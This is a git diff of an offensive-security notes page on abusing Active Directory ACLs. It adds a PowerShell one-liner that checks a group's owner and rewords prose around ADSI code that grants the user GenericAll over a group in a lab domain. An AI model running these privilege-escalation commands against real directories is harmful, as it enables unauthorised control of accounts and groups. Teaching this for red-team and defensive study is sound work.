@@ -195,13 +195,23 @@ Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:
 
 ### WriteDACL + WriteOwner
 
-If you have `WriteDACL` on an AD object you're the owner of, like I'm the owner of a `Test` AD group:
+If you are the owner of a group, like I'm the owner of a `Test` AD group:
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-10-19-02-57.png)
 
+Which you can of course do through powershell:
+
+```csharp
+([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
+```
+
+![](../../.gitbook/assets/screenshot-from-2018-11-10-19-29-27.png)
+
+And you have a `WriteDACL` on that AD object:
+
 ![](../../.gitbook/assets/screenshot-from-2018-11-10-19-07-16.png)
 
-You can now give yourself [`GenericAll`](abusing-active-directory-acls-aces.md#genericall-on-group) privileges with a sprinkle of ADSI sorcery:
+...you can give yourself [`GenericAll`](abusing-active-directory-acls-aces.md#genericall-on-group) privileges with a sprinkle of ADSI sorcery:
 
 ```csharp
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
@@ -211,11 +221,13 @@ $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
 
-Which means you fully control the AD object now - and for example can add a new users to the group if the AD object is a group:
+Which means you now fully control the AD object:
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-10-19-02-49.png)
 
-Interesting, but I could not make it work using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:
+This effectively means that you can now add new users to the group.
+
+Interesting to note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:
 
 ```csharp
 $path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
